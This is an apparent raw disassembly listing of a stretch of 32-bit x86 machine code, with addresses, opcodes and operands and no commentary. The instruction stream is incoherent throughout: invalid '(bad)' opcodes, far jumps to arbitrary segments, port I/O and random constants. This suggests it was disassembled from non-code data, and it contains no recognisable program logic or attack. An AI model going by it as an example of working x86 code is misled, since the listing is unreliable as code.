  40c729:	mov    esp,0x8953d05b
  40c72e:	cmp    ebx,esp
  40c730:	mov    ds:0x53430ffc,al
  40c735:	and    cl,BYTE PTR [edx]
  40c737:	or     DWORD PTR gs:[eax],0xaf0d5daf
  40c73e:	cwde   
  40c73f:	arpl   WORD PTR [ebx-0x6a279cda],cx
  40c745:	gs rol edi,0x69
  40c749:	and    al,0x56
  40c74b:	jl     0x40c743
  40c74d:	aaa    
  40c74e:	stos   BYTE PTR es:[edi],al
  40c74f:	xor    BYTE PTR [edx-0x497e465],dh
  40c755:	dec    edi
  40c756:	xchg   edi,eax
  40c757:	dec    esi
  40c758:	cmp    DWORD PTR [edi],edi
  40c75a:	cmp    al,0x74
  40c75c:	outs   dx,BYTE PTR ds:[esi]
  40c75d:	pop    ds
  40c75e:	ins    BYTE PTR es:[edi],dx
  40c75f:	push   ecx
  40c760:	loopne 0x40c748
  40c762:	ret    
  40c763:	mov    esi,0x74f53879
  40c768:	cli    
  40c769:	push   0x9ac6b20b
  40c76e:	mov    eax,0xe56b7b37
  40c773:	pop    ecx
  40c774:	cwde   
  40c775:	xor    bh,BYTE PTR [esi]
  40c777:	fisttp QWORD PTR [eax+0x4523fda0]
  40c77d:	dec    eax
  40c77e:	xlat   BYTE PTR ds:[ebx]
  40c77f:	jle    0x40c7e5
  40c781:	lods   al,BYTE PTR ds:[esi]
  40c782:	aad    0xc8
  40c784:	retf   
  40c785:	push   eax
  40c786:	aas    
  40c787:	loop   0x40c715
  40c789:	jmp    0xb190:0x5f3e8d68
  40c790:	sbb    eax,0xdd78afa7
  40c796:	int    0xaf
  40c798:	xor    ch,BYTE PTR [ecx-0x2f]
  40c79b:	push   0xffffffd6
  40c79d:	bound  esp,QWORD PTR [eax-0x58]
  40c7a0:	enter  0x8554,0x4b
  40c7a4:	add    DWORD PTR [eax-0x7a],esp
  40c7a7:	or     ch,BYTE PTR [ebx]
  40c7a9:	test   esp,ebx
  40c7ab:	sub    BYTE PTR [edi],ah
  40c7ad:	sbb    BYTE PTR [eax+eiz*8-0x6],0x9d
  40c7b2:	sbb    ah,BYTE PTR [esi]
  40c7b4:	icebp  
  40c7b5:	inc    ebx
  40c7b6:	fmulp  st(1),st
  40c7b8:	push   ebx
  40c7b9:	jg     0x40c7e9
  40c7bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7bc:	je     0x40c7bc
  40c7be:	adc    BYTE PTR [ebx-0x64],ah
  40c7c1:	lock mov BYTE PTR [ebx],0x1f
  40c7c5:	push   es
  40c7c6:	dec    esp
  40c7c7:	and    BYTE PTR [ebx+0x52a37fa3],dh
  40c7cd:	aaa    
  40c7ce:	std    
  40c7cf:	adc    al,0xff
  40c7d1:	aas    
  40c7d2:	xchg   ebp,eax
  40c7d3:	cmp    eax,DWORD PTR [ebp*8+0x4647ee1b]
  40c7da:	lock imul edx,DWORD PTR [ebx],0xffffffe6
  40c7de:	lahf   
  40c7df:	sbb    dl,dl
  40c7e1:	xchg   ebx,eax
  40c7e2:	push   0xffffff96
  40c7e4:	add    eax,0xc8c60139
  40c7e9:	(bad)  
  40c7eb:	pop    ds
  40c7ec:	test   BYTE PTR [edx+0x10e75082],0x7c
  40c7f3:	outs   dx,DWORD PTR ds:[esi]
  40c7f4:	mov    bh,0x3a
  40c7f6:	mov    bl,0x4a
  40c7f8:	ror    BYTE PTR [edi],0xc8
  40c7fb:	push   eax
  40c7fc:	clc    
  40c7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7fe:	sub    al,BYTE PTR [edi-0x7b374f1e]
  40c804:	adc    esp,ebp
  40c806:	popf   
  40c807:	jmp    0x153051ed
  40c80c:	in     al,dx
  40c80d:	stos   BYTE PTR es:[edi],al
  40c80e:	repnz xchg esi,eax
  40c810:	pop    ds
  40c811:	mov    eax,ds:0xf1b48964
  40c816:	retf   
  40c817:	jp     0x40c807
  40c819:	ficomp WORD PTR [edi-0x1]
  40c81c:	mov    dh,0x44
  40c81e:	mov    edx,esi
  40c820:	std    
  40c821:	inc    esi
  40c822:	ss jo  0x40c7c4
  40c825:	mul    DWORD PTR [eax+0x653329bf]
  40c82b:	out    dx,al
  40c82c:	fwait
  40c82d:	shl    ch,1
  40c82f:	cmp    eax,0x16b2d59e
  40c834:	pop    eax
  40c835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c836:	inc    ecx
  40c837:	jns    0x40c801
  40c839:	inc    DWORD PTR [edx-0x3484008]
  40c83f:	mov    ah,0x1e
  40c841:	test   al,0xac
  40c843:	sbb    al,0x57
  40c845:	cmp    DWORD PTR [ebx-0x48365e42],esp
  40c84b:	out    0x1e,al
  40c84d:	div    edx
  40c84f:	mov    edi,DWORD PTR [ebx-0x3e5497b8]
  40c855:	xchg   dx,ax
  40c857:	mov    edi,0x52a8a5a
  40c85c:	mov    bh,0xb5
  40c85e:	xchg   ebx,eax
  40c85f:	xor    cl,BYTE PTR [edi]
  40c861:	ss push edx
  40c863:	lock jmp 0x40c802
  40c866:	jo     0x40c84b
  40c868:	push   0xffffffcc
  40c86a:	or     BYTE PTR [edx-0x24],bl
  40c86d:	loopne 0x40c8e5
  40c86f:	push   ebp
  40c870:	push   edx
  40c871:	and    eax,0xccd3b427
  40c876:	std    
  40c877:	jecxz  0x40c80b
  40c879:	push   esp
  40c87a:	nop
  40c87b:	sub    al,0xf8
  40c87d:	adc    ch,BYTE PTR [esi-0x1f]
  40c880:	push   eax
  40c881:	push   cs
  40c882:	sub    ch,0x8f
  40c885:	jno    0x40c8d6
  40c887:	lea    eax,[esi]
  40c889:	mov    dl,0xc
  40c88b:	xchg   edx,eax
  40c88c:	and    BYTE PTR [ebx+esi*2],cl
  40c88f:	cmp    BYTE PTR [ecx-0x70ad8e35],bl
  40c895:	out    dx,eax
  40c896:	inc    ebx
  40c897:	cmp    eax,esi
  40c899:	sub    BYTE PTR [ebx],al
  40c89b:	pusha  
  40c89c:	jp     0x40c849
  40c89e:	jl     0x40c82e
  40c8a0:	mov    ds:0xf1707ac,eax
  40c8a5:	xchg   DWORD PTR [edx],ebp
  40c8a7:	jmp    0x5b93:0x854f7dbe
  40c8ae:	icebp  
  40c8af:	jmp    0x40c8b0
  40c8b1:	pop    es
  40c8b2:	or     al,0x8e
  40c8b4:	ficomp WORD PTR [ecx-0x5b203d65]
  40c8ba:	cmp    eax,0xb87bfbdf
  40c8bf:	jno    0x40c8e8
  40c8c1:	fistp  DWORD PTR [ecx]
  40c8c3:	sub    DWORD PTR [edi+0x6a],ebx
  40c8c6:	fisub  DWORD PTR [ebx-0x64]
  40c8c9:	out    dx,al
  40c8ca:	clc    
  40c8cb:	in     al,0xa3
  40c8cd:	xchg   edx,eax
  40c8ce:	cmp    BYTE PTR [esi],al
  40c8d0:	cdq    
  40c8d1:	push   0x62
  40c8d3:	test   BYTE PTR [eax+0x4d],cl
  40c8d6:	mov    ebp,0x2c1a0416
  40c8db:	and    ebx,esp
  40c8dd:	pop    ebx
  40c8de:	mov    al,ds:0x9faaf21e
  40c8e3:	inc    ebp
  40c8e4:	in     al,0xd1
  40c8e6:	jno    0x40c942
  40c8e8:	jnp    0x40c8df
  40c8ea:	sbb    al,0x60
  40c8ec:	adc    al,ch
  40c8ee:	je     0x40c8d7
  40c8f0:	lods   eax,DWORD PTR ds:[esi]
  40c8f1:	jae    0x40c927
  40c8f3:	stc    
  40c8f4:	(bad)  [edi]
  40c8f6:	cmp    DWORD PTR [edi+0x6f],0xffffffff
  40c8fa:	dec    eax
  40c8fb:	stc    
  40c8fc:	inc    ebx
  40c8fd:	xchg   BYTE PTR [eax],bl
  40c8ff:	mov    ecx,0x3d77dcec
  40c904:	dec    ecx
  40c905:	lea    ax,[edx]
  40c908:	push   edi
  40c909:	add    BYTE PTR [esi+0x6b573918],ch
  40c90f:	addr16 inc edx
  40c911:	js     0x40c916
  40c913:	pop    esi
  40c914:	fistp  QWORD PTR [edx]
  40c916:	or     ch,ah
  40c918:	ret    0xc7c
  40c91b:	pusha  
  40c91c:	shr    BYTE PTR [edx+0x3],1
  40c91f:	dec    edx
  40c920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c921:	mov    al,0xed
  40c923:	iret   
  40c924:	pop    edx
  40c925:	test   esi,esi
  40c927:	cli    
  40c928:	sub    edx,DWORD PTR [edx-0x4af0f0ba]
  40c92e:	cld    
  40c92f:	mov    esp,0xf403f571
  40c934:	pop    ebp
  40c935:	outs   dx,DWORD PTR ds:[esi]
  40c936:	lods   al,BYTE PTR ds:[esi]
  40c937:	jns    0x40c8f5
  40c939:	pop    es
  40c93a:	mov    ecx,0xa58a41fe
  40c93f:	jno    0x40c948
  40c941:	lods   al,BYTE PTR ds:[esi]
  40c942:	cmp    al,0x70
  40c944:	pop    es
  40c945:	push   ebp
  40c946:	js     0x40c916
  40c948:	mov    ds:0xa5cd1aa5,al
  40c94d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94e:	inc    edx
  40c94f:	push   edx
  40c950:	mov    ebp,0x620cbd0c
  40c955:	dec    edi
  40c956:	lds    esi,FWORD PTR [eax+0x1dd6b228]
  40c95c:	xchg   ebp,eax
  40c95d:	div    DWORD PTR [edx]
  40c95f:	jl     0x40c97a
  40c961:	shl    esp,0x18
  40c964:	jbe    0x40c943
  40c966:	mov    DWORD PTR [edi+0x2e57626e],esp
  40c96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c96d:	enter  0xb2bc,0xe
  40c971:	fsub   st,st(5)
  40c973:	js     0x40c959
  40c975:	xchg   ecx,eax
  40c976:	test   eax,0x50ccf679
  40c97b:	add    al,0xea
  40c97d:	popf   
  40c97e:	sub    DWORD PTR ds:0x8980eca7,0xd9680c12
  40c988:	mov    cl,0x74
  40c98a:	scas   al,BYTE PTR es:[edi]
  40c98b:	mov    bl,0x94
  40c98d:	gs push cs
  40c98f:	or     al,0x78
  40c991:	jbe    0x40c9cb
  40c993:	pop    eax
  40c994:	jl     0x40c9b0
  40c996:	iret   
  40c997:	call   FWORD PTR [ecx]
  40c999:	call   0x38d:0xed7822b4
  40c9a0:	(bad)  
  40c9a2:	lds    ebp,FWORD PTR [edx]
  40c9a4:	stos   DWORD PTR es:[edi],eax
  40c9a5:	or     bl,BYTE PTR [ebp+ebp*2-0x6a814f4c]
  40c9ac:	shr    DWORD PTR [ebp+0x34cf9ce],1
  40c9b2:	dec    esi
  40c9b3:	mov    ebx,0x21fbe084
  40c9b8:	sbb    esp,DWORD PTR [edx-0x5a]
  40c9bb:	dec    esp
  40c9bc:	gs leave 
  40c9be:	std    
  40c9bf:	das    
  40c9c0:	cld    
  40c9c1:	stos   DWORD PTR es:[edi],eax
  40c9c2:	call   0x1e41:0x9e8f188a
  40c9c9:	add    ch,BYTE PTR [esi]
  40c9cb:	xor    edx,DWORD PTR [eax]
  40c9cd:	mov    esi,0xea792cdb
  40c9d2:	(bad)  
  40c9d3:	push   cs
  40c9d4:	stc    
  40c9d5:	rcr    ebx,cl
  40c9d7:	and    al,0x2e
  40c9d9:	push   edx
  40c9da:	push   ecx
  40c9db:	cdq    
  40c9dc:	scas   al,BYTE PTR es:[edi]
  40c9dd:	ins    BYTE PTR es:[edi],dx
  40c9de:	fsub   DWORD PTR [eax-0x308841f6]
  40c9e4:	nop
  40c9e5:	jge    0x40ca15
  40c9e7:	and    DWORD PTR [edx],0xffffff9b
  40c9ea:	sbb    ebp,ebp
  40c9ec:	scas   eax,DWORD PTR es:[edi]
  40c9ed:	in     eax,dx
  40c9ee:	sbb    DWORD PTR [ecx+ecx*8+0x44b00aa5],0xffffffbb
  40c9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f7:	shl    DWORD PTR [ecx-0x39a3e9e9],1
  40c9fd:	inc    eax
  40c9fe:	dec    ecx
  40c9ff:	push   0x612fe1ec
  40ca04:	xchg   esi,eax
  40ca05:	pop    ebp
  40ca06:	enter  0x1421,0xb
  40ca0a:	pop    edi
  40ca0b:	push   esi
  40ca0c:	pop    es
  40ca0d:	and    esi,DWORD PTR [ebp+0x349506da]
  40ca13:	aas    
  40ca14:	dec    edx
  40ca15:	gs daa 
  40ca17:	and    esi,ecx
  40ca19:	shr    DWORD PTR [eax],1
  40ca1b:	and    al,0xbc
  40ca1d:	add    bl,BYTE PTR fs:[ebx]
  40ca20:	xchg   BYTE PTR ds:0x43fb6683,cl
  40ca26:	fcmovu st,st(0)
  40ca28:	jp     0x40ca90
  40ca2a:	mov    al,ds:0x3bda703c
  40ca2f:	enter  0x461e,0x74
  40ca33:	out    0xc3,al
  40ca35:	repz out 0x48,al
  40ca38:	xor    DWORD PTR [edi-0x3e1e815f],esp
  40ca3e:	faddp  st(6),st
  40ca40:	pop    edx
  40ca41:	inc    edx
  40ca42:	les    esi,FWORD PTR [esp+edx*4-0xc]
  40ca46:	scas   eax,DWORD PTR es:[edi]
  40ca47:	lea    edi,[eax-0x1ae2b15e]
  40ca4d:	ret    
  40ca4e:	and    al,0x47
  40ca50:	dec    ebp
  40ca51:	ds rcr bh,0x5e
  40ca55:	add    cl,BYTE PTR [edi-0x581515af]
  40ca5b:	jae    0x40ca27
  40ca5d:	ret    
  40ca5e:	or     DWORD PTR [ebp+0x14],edi
  40ca61:	rcl    ebx,cl
  40ca63:	shl    ch,1
  40ca65:	pop    ss
  40ca66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca67:	mov    ecx,0x837d07c2
  40ca6c:	gs pop eax
  40ca6e:	imul   BYTE PTR [edx+ecx*1-0x48b6d255]
  40ca75:	mov    DWORD PTR [edi],edi
  40ca77:	sahf   
  40ca78:	sub    eax,0x44e6a10f
  40ca7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca7e:	jnp    0x40ca27
  40ca80:	jp     0x40ca90
  40ca82:	sub    al,al
  40ca84:	in     al,dx
  40ca85:	xor    al,BYTE PTR [ecx]
  40ca87:	jle    0x40ca21
  40ca89:	mov    DWORD PTR [esi+0x77],esp
  40ca8c:	xor    eax,0x21247c5b
  40ca91:	scas   eax,DWORD PTR es:[edi]
  40ca92:	sar    DWORD PTR [ebx+eax*2],1
  40ca95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca96:	xlat   BYTE PTR ds:[ebx]
  40ca97:	xchg   BYTE PTR [edx],ah
  40ca99:	jmp    0x61a0:0x3404e873
  40caa0:	jnp    0x40cab6
  40caa2:	gs popa 
  40caa4:	in     al,0x91
  40caa6:	cmp    BYTE PTR [esp+edx*4-0x9],0xdd
  40caab:	leave  
  40caac:	aad    0xc6
  40caae:	mov    dh,BYTE PTR [eax]
  40cab0:	inc    ebp
  40cab1:	in     eax,0x34
  40cab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cab4:	jmp    0x40caf1
  40cab6:	es ret 0xc928
  40caba:	cwde   
  40cabb:	rcl    DWORD PTR [eax-0x45fd5258],0x8e
  40cac2:	push   ebx
  40cac3:	int    0x3b
  40cac5:	sahf   
  40cac6:	or     ah,BYTE PTR [eax+eax*4-0x4407c29e]
  40cacd:	pop    eax
  40cace:	pop    esi
  40cacf:	lds    eax,FWORD PTR [ebx+0x47]
  40cad2:	cmp    bh,BYTE PTR [edi+0x1]
  40cad5:	pushf  
  40cad6:	rcl    BYTE PTR [edx],cl
  40cad8:	cmp    BYTE PTR [eax],0xa7
  40cadb:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40cadd:	cmp    DWORD PTR ds:0x3187b652,edx
  40cae3:	or     al,BYTE PTR [ebp+0x76d9ad45]
  40cae9:	(bad)  
  40caea:	aam    0xcf
  40caec:	xchg   cl,ch
  40caee:	jle    0x40cb6e
  40caf0:	es in  al,dx
  40caf2:	ins    BYTE PTR es:[edi],dx
  40caf3:	rol    ebx,cl
  40caf5:	out    0x82,al
  40caf7:	mov    cl,0xde
  40caf9:	cmp    al,BYTE PTR [eax]
  40cafb:	push   esi
  40cafc:	xor    BYTE PTR [edx+0x17],dh
  40caff:	mov    bl,0xb4
  40cb01:	pop    esp
  40cb02:	xchg   ecx,eax
  40cb03:	cmp    cl,BYTE PTR [ecx+0x3e]
  40cb06:	adc    ecx,ecx
  40cb08:	test   DWORD PTR [ecx],ecx
  40cb0a:	cs push edi
  40cb0c:	int3   
  40cb0d:	jae    0x40ca98
  40cb0f:	in     al,dx
  40cb10:	pop    ecx
  40cb11:	enter  0x661a,0xd3
  40cb15:	retf   
  40cb16:	jnp    0x40caf9
  40cb18:	jecxz  0x40cab2
  40cb1a:	outs   dx,BYTE PTR ds:[esi]
  40cb1b:	mov    ds:0xc88bf035,al
  40cb20:	jae    0x40cb2c
  40cb22:	pop    es
  40cb23:	mov    ecx,0x91920cb4
  40cb28:	aas    
  40cb29:	and    ebx,DWORD PTR [ecx+0x2c]
  40cb2c:	sbb    DWORD PTR [esi-0xe786a19],esi
  40cb32:	sub    bh,bl
  40cb34:	test   ch,bh
  40cb36:	into   
  40cb37:	jne    0x40cba3
  40cb39:	fcmovnu st,st(2)
  40cb3b:	mov    cl,0xf1
  40cb3d:	dec    esp
  40cb3e:	nop
  40cb3f:	jg     0x40cb02
  40cb41:	push   ss
  40cb42:	push   eax
  40cb43:	lahf   
  40cb44:	(bad)  [eax+ebx*1+0x1f]
  40cb48:	in     al,dx
  40cb49:	sbb    al,0x71
  40cb4b:	mov    ecx,0x5e4c8d1
  40cb50:	pop    edi
  40cb51:	mov    eax,ds:0x91c13f60
  40cb56:	sbb    eax,0x33dc3d0
  40cb5b:	cwde   
  40cb5c:	or     DWORD PTR [eax-0x2d],edx
  40cb5f:	jo     0x40cb37
  40cb61:	das    
  40cb62:	fldcw  WORD PTR [ebx]
  40cb64:	pop    ebp
  40cb65:	sub    BYTE PTR [edx+ebx*1+0x69f9711c],bh
  40cb6c:	ror    ecx,cl
  40cb6e:	sub    DWORD PTR [eax-0x53ec1a60],esp
  40cb74:	or     DWORD PTR [esi+0x45],esi
  40cb77:	mov    bh,0xf3
  40cb79:	adc    DWORD PTR [esi],0x3d
  40cb7c:	xchg   BYTE PTR [edx+0x20],ch
  40cb7f:	mov    cl,0x7f
  40cb81:	lds    ebp,FWORD PTR [ebp+eax*4+0x21]
  40cb85:	fidivr DWORD PTR [ecx]
  40cb87:	pop    edx
  40cb88:	fisub  DWORD PTR ds:0x8378e95d
  40cb8e:	test   al,0x8e
  40cb90:	or     BYTE PTR [edx+0x52],dl
  40cb93:	adc    eax,0x16d29d0f
  40cb98:	dec    ebp
  40cb99:	cmp    BYTE PTR [esi+edi*2],ah
  40cb9c:	adc    al,0xd0
  40cb9e:	mov    cl,bh
  40cba0:	push   edi
  40cba1:	mov    DWORD PTR [eax],edi
  40cba3:	dec    ecx
  40cba4:	(bad)  
  40cba5:	xlat   BYTE PTR ds:[ebx]
  40cba6:	push   ss
  40cba7:	dec    esp
  40cba8:	jl     0x40cb7e
  40cbaa:	inc    esi
  40cbab:	mov    bh,BYTE PTR [eax+0x3f]
  40cbae:	and    al,0x1f
  40cbb0:	pop    edx
  40cbb1:	xchg   edx,eax
  40cbb2:	mov    bh,0x65
  40cbb4:	std    
  40cbb5:	xchg   edi,eax
  40cbb6:	sar    BYTE PTR [esi-0x180d59d2],cl
  40cbbc:	pop    esi
  40cbbd:	jne    0x40cb95
  40cbbf:	xlat   BYTE PTR ds:[ebx]
  40cbc0:	les    ebx,FWORD PTR [edi]
  40cbc2:	and    BYTE PTR [esi+0x4d],bh
  40cbc5:	shl    DWORD PTR ds:[ecx-0x63],cl
  40cbc9:	mov    bl,0xc8
  40cbcb:	repnz fidivr WORD PTR [ecx+eiz*2]
  40cbcf:	pusha  
  40cbd0:	adc    al,0x32
  40cbd2:	sbb    eax,0xa45a7d28
  40cbd7:	adc    cl,BYTE PTR [ebx-0x75]
  40cbda:	inc    ecx
  40cbdb:	xchg   ebx,eax
  40cbdc:	adc    al,BYTE PTR [eax-0x1d]
  40cbdf:	outs   dx,DWORD PTR ds:[esi]
  40cbe0:	jecxz  0x40cb6e
  40cbe2:	pop    ds
  40cbe3:	repnz add edx,ebp
  40cbe6:	cmp    DWORD PTR [ebp-0x7c],edx
  40cbe9:	int3   
  40cbea:	out    dx,al
  40cbeb:	lds    ecx,FWORD PTR ds:0x2c8909ca
  40cbf1:	popa   
  40cbf2:	fimul  WORD PTR [eax+0x48fc860d]
  40cbf8:	jbe    0x40cba5
  40cbfa:	fcom   DWORD PTR [edx-0x6b764eb5]
  40cc00:	xor    eax,0x99969f17
  40cc05:	lods   eax,DWORD PTR ds:[esi]
  40cc06:	scas   al,BYTE PTR es:[edi]
  40cc07:	push   0x15
  40cc09:	and    dl,dl
  40cc0b:	mov    ecx,0xf749bc43
  40cc10:	pop    ss
  40cc11:	popa   
  40cc12:	ins    DWORD PTR es:[edi],dx
  40cc13:	add    DWORD PTR [eax+0x1e],esp
  40cc16:	xchg   edx,eax
  40cc17:	cmp    ebx,DWORD PTR [ebx]
  40cc19:	dec    esi
  40cc1a:	jmp    0x72a72a0
  40cc1f:	inc    esp
  40cc20:	adc    al,0x1e
  40cc22:	sbb    DWORD PTR [ebx],eax
  40cc24:	loop   0x40cbff
  40cc26:	xchg   ecx,eax
  40cc27:	loop   0x40cca7
  40cc29:	xchg   edi,eax
  40cc2a:	xor    eax,0xf193130f
  40cc2f:	aaa    
  40cc30:	mov    al,ds:0x76463490
  40cc35:	sbb    BYTE PTR [eax],bh
  40cc37:	fldcw  WORD PTR [ebx]
  40cc39:	add    BYTE PTR [eax-0x2a],0xd2
  40cc3d:	mov    eax,0xf379e0fc
  40cc42:	sbb    al,BYTE PTR [edi-0x7c09b7]
  40cc48:	xchg   edi,eax
  40cc49:	xor    eax,0x166328b3
  40cc4e:	adc    BYTE PTR [esi-0x3e],0x3
  40cc52:	lods   al,BYTE PTR ds:[esi]
  40cc53:	(bad)  
  40cc54:	dec    eax
  40cc55:	mov    ds:0xa68c5687,al
  40cc5a:	(bad)  
  40cc5b:	sub    bh,ah
  40cc5d:	out    0xbf,al
  40cc5f:	xchg   esp,eax
  40cc60:	fwait
  40cc61:	inc    eax
  40cc62:	aaa    
  40cc63:	adc    DWORD PTR [eax],0x29d3b1f
  40cc69:	test   DWORD PTR [esi-0x3f6a20c],esi
  40cc6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc70:	(bad)  
  40cc71:	or     eax,0x554f9f51
  40cc76:	stos   BYTE PTR es:[edi],al
  40cc77:	pop    esp
  40cc78:	jge    0x40cc9d
  40cc7a:	xlat   BYTE PTR ds:[ebx]
  40cc7b:	add    edi,DWORD PTR [edx]
  40cc7d:	cmp    al,bl
  40cc7f:	or     esi,DWORD PTR [edi-0x66]
  40cc82:	ficomp DWORD PTR [edi]
  40cc84:	cmp    al,0xfc
  40cc86:	ss adc BYTE PTR cs:[eax-0xd],ch
  40cc8b:	mov    cs,WORD PTR [ebx+0x49]
  40cc8e:	aad    0xb9
  40cc90:	cwde   
  40cc91:	cmp    eax,0xb882a33b
  40cc96:	leave  
  40cc97:	sbb    eax,0xfff31e1e
  40cc9c:	ret    0x8464
  40cc9f:	inc    edx
  40cca0:	lds    eax,FWORD PTR [edx]
  40cca2:	repz call 0x5ff7:0xd2c411ae
  40ccaa:	aas    
  40ccab:	add    al,0xb6
  40ccad:	xchg   edi,eax
  40ccae:	pop    edi
  40ccaf:	jno    0x40cc8e
  40ccb1:	dec    ebp
  40ccb2:	or     BYTE PTR [ecx],dh
  40ccb4:	sub    al,0x2
  40ccb6:	dec    ebp
  40ccb7:	loop   0x40ccc5
  40ccb9:	inc    ecx
  40ccba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccbb:	scas   al,BYTE PTR es:[edi]
  40ccbc:	push   ecx
  40ccbd:	in     eax,0x52
  40ccbf:	fisubr DWORD PTR [ebp+eax*1+0x7fa88991]
  40ccc6:	mov    al,ds:0x817d23d
  40cccb:	mov    DWORD PTR [esi-0x69f7eebc],ecx
  40ccd1:	sar    ecx,1
  40ccd3:	retf   0xa266
  40ccd6:	dec    esp
  40ccd7:	rol    BYTE PTR [esi-0x79],1
  40ccda:	cmp    BYTE PTR [esp+eiz*4],ch
  40ccdd:	lahf   
  40ccde:	pop    ebp
  40ccdf:	imul   ecx,edx,0x4b
  40cce2:	cmp    al,0xc6
  40cce4:	xchg   esp,eax
  40cce5:	mov    bh,0x13
  40cce7:	mov    bh,0xf9
  40cce9:	bound  ebp,QWORD PTR [ebx]
  40cceb:	inc    ebx
  40ccec:	mov    DWORD PTR [esi-0x60],0xa92ef4bf
  40ccf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf4:	ret    0x7c0f
  40ccf7:	pop    eax
  40ccf8:	jae    0x40cd5c
  40ccfa:	test   al,0x9d
  40ccfc:	cld    
  40ccfd:	jno    0x40cd30
  40ccff:	daa    
  40cd00:	and    ah,BYTE PTR [eax+edx*2+0x7936935c]
  40cd07:	dec    esp
  40cd08:	push   edx
  40cd09:	jmp    0xe98aebbc
  40cd0e:	xor    BYTE PTR ds:0xdf67ee89,dh
  40cd14:	inc    eax
  40cd15:	lds    edi,FWORD PTR [edx+eiz*4+0x19]
  40cd19:	loop   0x40cd24
  40cd1b:	(bad)  
  40cd1c:	dec    esp
  40cd1d:	or     BYTE PTR [esp+edx*2+0x616674c2],bl
  40cd24:	pop    ebx
  40cd25:	es jg  0x40cd69
  40cd28:	clc    
  40cd29:	out    dx,al
  40cd2a:	and    ebx,DWORD PTR [edx+0xe144a92]
  40cd30:	xchg   edi,eax
  40cd31:	mov    al,ah
  40cd33:	rol    BYTE PTR [eax+esi*1-0x24687ecc],0x6a
  40cd3b:	push   0x8678f178
  40cd40:	imul   ebx,eax,0xe33cd791
  40cd46:	(bad)  
  40cd47:	mov    BYTE PTR [ebx+0x2792948e],ah
  40cd4d:	loope  0x40cd5d
  40cd4f:	cmc    
  40cd50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd51:	test   DWORD PTR [esi+0x5970d711],esi
  40cd57:	xchg   edi,eax
  40cd58:	xor    ch,BYTE PTR [esi]
  40cd5a:	loop   0x40cdcf
  40cd5c:	rol    BYTE PTR es:[ebx+edx*8+0x445b89c7],0x8f
  40cd65:	dec    esp
  40cd66:	mov    WORD PTR [ecx-0xc],es
  40cd69:	inc    ecx
  40cd6a:	cdq    
  40cd6b:	dec    eax
  40cd6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd6d:	lock (bad) 
  40cd70:	aad    0xb7
  40cd72:	in     al,0x5e
  40cd74:	into   
  40cd75:	loop   0x40cd74
  40cd77:	xchg   BYTE PTR [edi],ah
  40cd79:	int    0xae
  40cd7b:	ins    BYTE PTR es:[edi],dx
  40cd7c:	mov    ecx,DWORD PTR [edi+edx*1+0x78]
  40cd80:	xor    BYTE PTR [edx+0x4771dcff],dh
  40cd86:	mov    cl,0x1b
  40cd88:	jne    0x40cd48
  40cd8a:	adc    al,0x8f
  40cd8c:	xchg   BYTE PTR ds:0x84f80fda,bh
  40cd92:	in     eax,dx
  40cd93:	leave  
  40cd94:	test   ah,0x3f
  40cd97:	adc    DWORD PTR [edx-0x33],edi
  40cd9a:	ja     0x40cd60
  40cd9c:	adc    al,0x97
  40cd9e:	adc    BYTE PTR [ebx],dh
  40cda0:	pmuludq mm7,QWORD PTR [edi+ebx*2+0x6ba83ef5]
  40cda8:	cmp    eax,0xde5db9e1
  40cdad:	(bad)  
  40cdaf:	adc    eax,0x2d77d4c2
  40cdb4:	xor    ah,dh
  40cdb6:	add    bh,al
  40cdb8:	imul   ecx,DWORD PTR [eax-0x28],0xffffffe0
  40cdbc:	xchg   esp,eax
  40cdbd:	stc    
  40cdbe:	(bad)  
  40cdbf:	xor    dl,BYTE PTR [ecx]
  40cdc1:	fmul   st,st(3)
  40cdc3:	repz jno 0x40ce24
  40cdc6:	pop    edi
  40cdc7:	sbb    bl,dl
  40cdc9:	leave  
  40cdca:	jmp    0x40ce10
  40cdcc:	ficomp WORD PTR [ebp+0x6a]
  40cdcf:	mov    al,ds:0x3c1f92ff
  40cdd4:	(bad)  
  40cdd5:	out    dx,eax
  40cdd6:	ror    DWORD PTR [eax-0x7d6d42d2],0x36
  40cddd:	dec    ebp
  40cdde:	xor    DWORD PTR [ebx+0x61c6807c],ecx
  40cde4:	aad    0x7f
  40cde6:	xchg   esp,eax
  40cde7:	push   0xffffffb5
  40cde9:	pop    ecx
  40cdea:	iret   
  40cdeb:	aam    0x15
  40cded:	hlt    
  40cdee:	pushf  
  40cdef:	arpl   si,ax
  40cdf1:	sbb    DWORD PTR [ebp+ebx*1+0x2b7e50f9],esi
  40cdf8:	(bad)  
  40cdfa:	cmp    ch,0xa1
  40cdfd:	cmp    DWORD PTR [edi],esi
  40cdff:	mov    ch,0x51
  40ce01:	ins    BYTE PTR es:[edi],dx
  40ce02:	aad    0x83
  40ce04:	mov    ch,BYTE PTR [ecx+ecx*2]
  40ce07:	push   edx
  40ce08:	pop    ds
  40ce09:	mov    eax,0xba302a0e
  40ce0e:	mov    eax,ds:0xa1d3c71
  40ce13:	mov    eax,ds:0xeb4be9f6
  40ce18:	cmovae ecx,esi
  40ce1b:	pushf  
  40ce1c:	sbb    eax,0x9a262b93
  40ce21:	adc    BYTE PTR [edi+0xc],bl
  40ce24:	cwde   
  40ce25:	out    dx,eax
  40ce26:	loopne 0x40ce4b
  40ce28:	lahf   
  40ce29:	inc    ebp
  40ce2a:	(bad)  
  40ce2b:	int3   
  40ce2c:	test   DWORD PTR [ebx+esi*4-0x21],edx
